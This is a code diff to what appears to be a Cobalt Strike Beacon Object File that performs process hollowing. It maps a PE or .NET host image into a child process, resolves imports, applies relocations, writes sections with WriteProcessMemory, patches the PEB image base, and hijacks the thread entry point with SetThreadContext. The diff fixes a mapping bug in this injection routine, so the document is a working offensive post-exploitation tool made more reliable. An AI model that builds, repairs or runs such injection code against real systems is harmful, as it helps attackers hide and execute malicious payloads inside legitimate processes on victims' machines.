@@ -588,35 +588,61 @@ static BOOL ValidatePE(BYTE *peData, DWORD peSize, PIMAGE_NT_HEADERS *ppNt) {
 }
 
 /* ================================================================
- *  Import resolution (the critical missing piece)
+ *  Map flat PE file into a SizeOfImage buffer (sections at VA offsets)
  *
- *  Walk IAT, LoadLibraryA each DLL in the LOCAL process (which
- *  maps it at the per-boot ASLR base shared by all processes),
- *  resolve each function, write the address into the PE's IAT
- *  in our LOCAL copy, which then gets written to the remote process.
- *
- *  This must happen BEFORE writing sections to the remote process.
+ *  ResolveImports and ApplyRelocations use RVAs as offsets, which only
+ *  works on a mapped image — NOT on the flat file where sections sit
+ *  at PointerToRawData offsets.  This function creates that mapped copy.
  * ================================================================ */
 
-static BOOL ResolveImports(BYTE *peData, DWORD peSize, PIMAGE_NT_HEADERS pNt) {
+static BYTE* MapPEToImage(BYTE *peData, DWORD peSize, PIMAGE_NT_HEADERS pNt) {
+    DWORD imageSize = pNt->OptionalHeader.SizeOfImage;
+    BYTE *mapped = (BYTE*)KERNEL32$LocalAlloc(0x40, imageSize);
+    if (!mapped) return NULL;
+
+    xmemset(mapped, 0, imageSize);
+    xmemcpy(mapped, peData, pNt->OptionalHeader.SizeOfHeaders);
+
+    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
+    for (DWORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
+        if (pSec[i].SizeOfRawData == 0) continue;
+        if (pSec[i].PointerToRawData + pSec[i].SizeOfRawData > peSize) continue;
+        if (pSec[i].VirtualAddress + pSec[i].SizeOfRawData > imageSize) continue;
+        xmemcpy(mapped + pSec[i].VirtualAddress,
+                peData + pSec[i].PointerToRawData,
+                pSec[i].SizeOfRawData);
+    }
+
+    return mapped;
+}
+
+/* ================================================================
+ *  Import resolution
+ *
+ *  Operates on a MAPPED image (sections at VA offsets) so RVAs
+ *  work directly as buffer offsets.  Uses per-boot ASLR property:
+ *  DLLs map at same base in every process for a given boot.
+ * ================================================================ */
+
+static BOOL ResolveImports(BYTE *mapped, DWORD imageSize, PIMAGE_NT_HEADERS pNt) {
     IMAGE_DATA_DIRECTORY impDir = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
     if (impDir.Size == 0 || impDir.VirtualAddress == 0)
         return TRUE;
 
-    if (impDir.VirtualAddress + sizeof(IMAGE_IMPORT_DESCRIPTOR) > peSize) {
+    if (impDir.VirtualAddress + sizeof(IMAGE_IMPORT_DESCRIPTOR) > imageSize) {
         BeaconPrintf(CALLBACK_ERROR, "Import directory out of bounds");
         return FALSE;
     }
 
-    PIMAGE_IMPORT_DESCRIPTOR pImp = (PIMAGE_IMPORT_DESCRIPTOR)(peData + impDir.VirtualAddress);
+    PIMAGE_IMPORT_DESCRIPTOR pImp = (PIMAGE_IMPORT_DESCRIPTOR)(mapped + impDir.VirtualAddress);
 
     for (; pImp->Name != 0; pImp++) {
-        if (pImp->Name >= peSize) {
+        if (pImp->Name >= imageSize) {
             BeaconPrintf(CALLBACK_ERROR, "Import DLL name offset out of bounds");
             return FALSE;
         }
 
-        char *dllName = (char*)(peData + pImp->Name);
+        char *dllName = (char*)(mapped + pImp->Name);
         HMODULE hMod = KERNEL32$LoadLibraryA(dllName);
         if (!hMod) {
             BeaconPrintf(CALLBACK_ERROR, "LoadLibraryA(%s) failed: %lu", dllName, KERNEL32$GetLastError());
@@ -626,15 +652,15 @@ static BOOL ResolveImports(BYTE *peData, DWORD peSize, PIMAGE_NT_HEADERS pNt) {
         ULONG_PTR *pThunk;
         ULONG_PTR *pOrigThunk;
 
-        if (pImp->FirstThunk >= peSize) {
+        if (pImp->FirstThunk >= imageSize) {
             BeaconPrintf(CALLBACK_ERROR, "FirstThunk out of bounds for %s", dllName);
             return FALSE;
         }
 
-        pThunk = (ULONG_PTR*)(peData + pImp->FirstThunk);
+        pThunk = (ULONG_PTR*)(mapped + pImp->FirstThunk);
 
-        if (pImp->OriginalFirstThunk && pImp->OriginalFirstThunk < peSize)
-            pOrigThunk = (ULONG_PTR*)(peData + pImp->OriginalFirstThunk);
+        if (pImp->OriginalFirstThunk && pImp->OriginalFirstThunk < imageSize)
+            pOrigThunk = (ULONG_PTR*)(mapped + pImp->OriginalFirstThunk);
         else
             pOrigThunk = pThunk;
 
@@ -649,11 +675,11 @@ static BOOL ResolveImports(BYTE *peData, DWORD peSize, PIMAGE_NT_HEADERS pNt) {
                     return FALSE;
                 }
             } else {
-                if (pOrigThunk[i] >= peSize) {
+                if (pOrigThunk[i] >= imageSize) {
                     BeaconPrintf(CALLBACK_ERROR, "Import hint/name out of bounds");
                     return FALSE;
                 }
-                PIMAGE_IMPORT_BY_NAME pName = (PIMAGE_IMPORT_BY_NAME)(peData + pOrigThunk[i]);
+                PIMAGE_IMPORT_BY_NAME pName = (PIMAGE_IMPORT_BY_NAME)(mapped + pOrigThunk[i]);
                 pFunc = KERNEL32$GetProcAddress(hMod, pName->Name);
                 if (!pFunc) {
                     BeaconPrintf(CALLBACK_ERROR, "%s!%s not found", dllName, pName->Name);
@@ -669,10 +695,10 @@ static BOOL ResolveImports(BYTE *peData, DWORD peSize, PIMAGE_NT_HEADERS pNt) {
 }
 
 /* ================================================================
- *  Relocation processing
+ *  Relocation processing (operates on mapped image)
  * ================================================================ */
 
-static BOOL ApplyRelocations(BYTE *peData, DWORD peSize, PIMAGE_NT_HEADERS pNt, ULONG_PTR delta) {
+static BOOL ApplyRelocations(BYTE *mapped, DWORD imageSize, PIMAGE_NT_HEADERS pNt, ULONG_PTR delta) {
     if (delta == 0) return TRUE;
 
     IMAGE_DATA_DIRECTORY relocDir = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
@@ -684,12 +710,12 @@ static BOOL ApplyRelocations(BYTE *peData, DWORD peSize, PIMAGE_NT_HEADERS pNt, 
         return TRUE;
     }
 
-    if (relocDir.VirtualAddress >= peSize) {
+    if (relocDir.VirtualAddress >= imageSize) {
         BeaconPrintf(CALLBACK_ERROR, "Relocation directory out of bounds");
         return FALSE;
     }
 
-    BYTE *pBlock = peData + relocDir.VirtualAddress;
+    BYTE *pBlock = mapped + relocDir.VirtualAddress;
     DWORD processed = 0;
 
     while (processed < relocDir.Size) {
@@ -706,12 +732,12 @@ static BOOL ApplyRelocations(BYTE *peData, DWORD peSize, PIMAGE_NT_HEADERS pNt, 
             DWORD patchRva = pageRva + offset;
 
             if (type == IMAGE_REL_BASED_DIR64) {
-                if (patchRva + 8 > peSize) continue;
-                ULONG_PTR *pPatch = (ULONG_PTR*)(peData + patchRva);
+                if (patchRva + 8 > imageSize) continue;
+                ULONG_PTR *pPatch = (ULONG_PTR*)(mapped + patchRva);
                 *pPatch += delta;
             } else if (type == IMAGE_REL_BASED_HIGHLOW) {
-                if (patchRva + 4 > peSize) continue;
-                DWORD *pPatch = (DWORD*)(peData + patchRva);
+                if (patchRva + 4 > imageSize) continue;
+                DWORD *pPatch = (DWORD*)(mapped + patchRva);
                 *pPatch += (DWORD)delta;
             } else if (type == IMAGE_REL_BASED_ABSOLUTE) {
                 /* padding, skip */
@@ -820,64 +846,84 @@ static BOOL HollowWithPE(HANDLE hProcess, HANDLE hThread, BYTE *peData, DWORD pe
 
     BeaconPrintf(CALLBACK_OUTPUT, "[+] Allocated 0x%lx bytes at 0x%p", pNt->OptionalHeader.SizeOfImage, pRemote);
 
-    /* Step 4: Resolve imports LOCALLY before writing to remote process.
-       Must happen before relocations so import thunks are filled first. */
-    if (!ResolveImports(peData, peSize, pNt)) {
+    /* Step 4: Map PE into SizeOfImage buffer so RVAs work as offsets */
+    DWORD imageSize = pNt->OptionalHeader.SizeOfImage;
+    BYTE *mapped = MapPEToImage(peData, peSize, pNt);
+    if (!mapped) {
+        BeaconPrintf(CALLBACK_ERROR, "MapPEToImage: %lu", KERNEL32$GetLastError());
+        KERNEL32$VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
+        return FALSE;
+    }
+
+    /* Re-locate pNt inside mapped buffer */
+    PIMAGE_DOS_HEADER pDosM = (PIMAGE_DOS_HEADER)mapped;
+    PIMAGE_NT_HEADERS pNtM = (PIMAGE_NT_HEADERS)(mapped + pDosM->e_lfanew);
+
+    /* Step 5: Resolve imports on mapped image */
+    if (!ResolveImports(mapped, imageSize, pNtM)) {
         BeaconPrintf(CALLBACK_ERROR, "Import resolution failed — aborting");
+        KERNEL32$LocalFree(mapped);
         KERNEL32$VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
         return FALSE;
     }
     BeaconPrintf(CALLBACK_OUTPUT, "[+] Imports resolved");
 
-    /* Step 5: Apply relocations if base changed */
-    ULONG_PTR delta = (ULONG_PTR)pRemote - pNt->OptionalHeader.ImageBase;
+    /* Step 6: Apply relocations if base changed */
+    ULONG_PTR delta = (ULONG_PTR)pRemote - pNtM->OptionalHeader.ImageBase;
     if (delta != 0) {
-        if (!ApplyRelocations(peData, peSize, pNt, delta)) {
+        if (!ApplyRelocations(mapped, imageSize, pNtM, delta)) {
             BeaconPrintf(CALLBACK_ERROR, "Relocation failed");
+            KERNEL32$LocalFree(mapped);
             KERNEL32$VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
             return FALSE;
         }
-        pNt->OptionalHeader.ImageBase = (ULONG_PTR)pRemote;
+        pNtM->OptionalHeader.ImageBase = (ULONG_PTR)pRemote;
         BeaconPrintf(CALLBACK_OUTPUT, "[+] Relocations applied (delta=0x%llx)", (unsigned long long)delta);
     }
 
-    /* Step 6: Write headers */
+    /* Step 7: Write mapped image to remote process */
     SIZE_T bw = 0;
-    if (!KERNEL32$WriteProcessMemory(hProcess, pRemote, peData,
-            pNt->OptionalHeader.SizeOfHeaders, &bw)) {
+    if (!KERNEL32$WriteProcessMemory(hProcess, pRemote, mapped,
+            pNtM->OptionalHeader.SizeOfHeaders, &bw)) {
         BeaconPrintf(CALLBACK_ERROR, "Write headers: %lu", KERNEL32$GetLastError());
+        KERNEL32$LocalFree(mapped);
         KERNEL32$VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
         return FALSE;
     }
 
-    /* Step 6b: Write sections */
-    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
-    for (DWORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
+    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNtM);
+    for (DWORD i = 0; i < pNtM->FileHeader.NumberOfSections; i++) {
         if (pSec[i].SizeOfRawData == 0) continue;
         if (!KERNEL32$WriteProcessMemory(hProcess, pRemote + pSec[i].VirtualAddress,
-                peData + pSec[i].PointerToRawData, pSec[i].SizeOfRawData, &bw)) {
+                mapped + pSec[i].VirtualAddress, pSec[i].SizeOfRawData, &bw)) {
             BeaconPrintf(CALLBACK_ERROR, "Write section %d: %lu", i, KERNEL32$GetLastError());
+            KERNEL32$LocalFree(mapped);
             KERNEL32$VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
             return FALSE;
         }
     }
 
-    /* Step 7: Set proper section protections */
-    if (!AdjustSectionProtections(hProcess, (ULONG_PTR)pRemote, pNt, pSec)) {
+    /* Save values we need after freeing mapped buffer */
+    DWORD entryRva = pNtM->OptionalHeader.AddressOfEntryPoint;
+
+    /* Step 8: Set proper section protections (pSec still valid, points into mapped) */
+    if (!AdjustSectionProtections(hProcess, (ULONG_PTR)pRemote, pNtM, pSec)) {
         BeaconPrintf(CALLBACK_OUTPUT, "[!] Some section protections failed (continuing)");
     }
 
-    /* Flush instruction cache */
-    KERNEL32$FlushInstructionCache(hProcess, pRemote, pNt->OptionalHeader.SizeOfImage);
+    KERNEL32$FlushInstructionCache(hProcess, pRemote, imageSize);
 
-    /* Step 8: Update PEB ImageBase */
+    KERNEL32$LocalFree(mapped);
+    mapped = NULL;
+
+    /* Step 9: Update PEB ImageBase */
     ULONG_PTR newBase = (ULONG_PTR)pRemote;
     if (!KERNEL32$WriteProcessMemory(hProcess, (PVOID)(pebAddr + 0x10), &newBase, sizeof(newBase), &bw)) {
         BeaconPrintf(CALLBACK_OUTPUT, "[!] PEB ImageBase update failed: %lu", KERNEL32$GetLastError());
     }
 
-    /* Step 9: Set RCX = entry point */
-    ctx.Rcx = (DWORD64)(pRemote + pNt->OptionalHeader.AddressOfEntryPoint);
+    /* Step 10: Set RCX = entry point */
+    ctx.Rcx = (DWORD64)(pRemote + entryRva);
 
     if (!KERNEL32$SetThreadContext(hThread, &ctx)) {
         BeaconPrintf(CALLBACK_ERROR, "SetThreadContext: %lu", KERNEL32$GetLastError());
@@ -1070,56 +1116,72 @@ static BOOL HollowWithDotNet(HANDLE hProcess, HANDLE hThread,
 
     BeaconPrintf(CALLBACK_OUTPUT, "[+] Host PE allocated at 0x%p", pRemote);
 
-    if (!ResolveImports(hostPE, dotnet_host_exe_len, pNt)) {
-        BeaconPrintf(CALLBACK_ERROR, "Host import resolution failed");
+    /* Map host PE so RVAs work as offsets for import/reloc processing */
+    DWORD hostImageSize = pNt->OptionalHeader.SizeOfImage;
+    BYTE *mapped = MapPEToImage(hostPE, dotnet_host_exe_len, pNt);
+    KERNEL32$LocalFree(hostPE);
+    hostPE = NULL;
+
+    if (!mapped) {
+        BeaconPrintf(CALLBACK_ERROR, "MapPEToImage host: %lu", KERNEL32$GetLastError());
         KERNEL32$VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
-        KERNEL32$LocalFree(hostPE);
         return FALSE;
     }
 
-    ULONG_PTR delta = (ULONG_PTR)pRemote - pNt->OptionalHeader.ImageBase;
+    PIMAGE_DOS_HEADER pDosH = (PIMAGE_DOS_HEADER)mapped;
+    PIMAGE_NT_HEADERS pNtH = (PIMAGE_NT_HEADERS)(mapped + pDosH->e_lfanew);
+
+    if (!ResolveImports(mapped, hostImageSize, pNtH)) {
+        BeaconPrintf(CALLBACK_ERROR, "Host import resolution failed");
+        KERNEL32$LocalFree(mapped);
+        KERNEL32$VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
+        return FALSE;
+    }
+
+    ULONG_PTR delta = (ULONG_PTR)pRemote - pNtH->OptionalHeader.ImageBase;
     if (delta != 0) {
-        if (!ApplyRelocations(hostPE, dotnet_host_exe_len, pNt, delta)) {
+        if (!ApplyRelocations(mapped, hostImageSize, pNtH, delta)) {
             BeaconPrintf(CALLBACK_ERROR, "Host relocation failed");
+            KERNEL32$LocalFree(mapped);
             KERNEL32$VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
-            KERNEL32$LocalFree(hostPE);
             return FALSE;
         }
-        pNt->OptionalHeader.ImageBase = (ULONG_PTR)pRemote;
+        pNtH->OptionalHeader.ImageBase = (ULONG_PTR)pRemote;
     }
 
     SIZE_T bw = 0;
-    if (!KERNEL32$WriteProcessMemory(hProcess, pRemote, hostPE,
-            pNt->OptionalHeader.SizeOfHeaders, &bw)) {
+    if (!KERNEL32$WriteProcessMemory(hProcess, pRemote, mapped,
+            pNtH->OptionalHeader.SizeOfHeaders, &bw)) {
         BeaconPrintf(CALLBACK_ERROR, "Write host headers: %lu", KERNEL32$GetLastError());
+        KERNEL32$LocalFree(mapped);
         KERNEL32$VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
-        KERNEL32$LocalFree(hostPE);
         return FALSE;
     }
 
-    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
-    for (DWORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
+    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNtH);
+    for (DWORD i = 0; i < pNtH->FileHeader.NumberOfSections; i++) {
         if (pSec[i].SizeOfRawData == 0) continue;
         if (!KERNEL32$WriteProcessMemory(hProcess, pRemote + pSec[i].VirtualAddress,
-                hostPE + pSec[i].PointerToRawData, pSec[i].SizeOfRawData, &bw)) {
+                mapped + pSec[i].VirtualAddress, pSec[i].SizeOfRawData, &bw)) {
             BeaconPrintf(CALLBACK_ERROR, "Write host section %d: %lu", i, KERNEL32$GetLastError());
+            KERNEL32$LocalFree(mapped);
             KERNEL32$VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
-            KERNEL32$LocalFree(hostPE);
             return FALSE;
         }
     }
 
-    AdjustSectionProtections(hProcess, (ULONG_PTR)pRemote, pNt, pSec);
-    KERNEL32$FlushInstructionCache(hProcess, pRemote, pNt->OptionalHeader.SizeOfImage);
+    AdjustSectionProtections(hProcess, (ULONG_PTR)pRemote, pNtH, pSec);
+    KERNEL32$FlushInstructionCache(hProcess, pRemote, hostImageSize);
+
+    DWORD hostEntryRva = pNtH->OptionalHeader.AddressOfEntryPoint;
+    KERNEL32$LocalFree(mapped);
+    mapped = NULL;
 
     ULONG_PTR newBase = (ULONG_PTR)pRemote;
     KERNEL32$WriteProcessMemory(hProcess, (PVOID)(pebAddr + 0x10), &newBase, sizeof(newBase), &bw);
 
-    ULONG_PTR entryPoint = (ULONG_PTR)(pRemote + pNt->OptionalHeader.AddressOfEntryPoint);
+    ULONG_PTR entryPoint = (ULONG_PTR)(pRemote + hostEntryRva);
     BeaconPrintf(CALLBACK_OUTPUT, "[+] Host hollowed, entry 0x%p", (void*)entryPoint);
-
-    KERNEL32$LocalFree(hostPE);
-    hostPE = NULL;
 
     /* --- Phase 2: Write config + assembly + args into child --- */
 
@@ -1284,25 +1346,6 @@ void go(char *rawArgs, int rawLen) {
         }
         payloadData = (BYTE*)peData;
         payloadSize = (DWORD)peDataLen;
-    }
-
-    /* For PE mode, we need a writable copy since we modify IAT + relocations in place.
-       Dotnet mode passes raw assembly bytes — no local modification needed. */
-    BYTE *workingCopy = NULL;
-    if (mode == MODE_PE) {
-        workingCopy = (BYTE*)KERNEL32$LocalAlloc(0x40, payloadSize);
-        if (!workingCopy) {
-            BeaconPrintf(CALLBACK_ERROR, "LocalAlloc for working copy: %lu", KERNEL32$GetLastError());
-            if (freePayload) KERNEL32$LocalFree(payloadData);
-            return;
-        }
-        xmemcpy(workingCopy, payloadData, payloadSize);
-        if (freePayload) {
-            KERNEL32$LocalFree(payloadData);
-            payloadData = NULL;
-        }
-        freePayload = TRUE;
-        payloadData = workingCopy;
     }
 
     BeaconPrintf(CALLBACK_OUTPUT, "[*] Mode: %s | Output: %s | Timeout: %ds | Spawnto: %s",
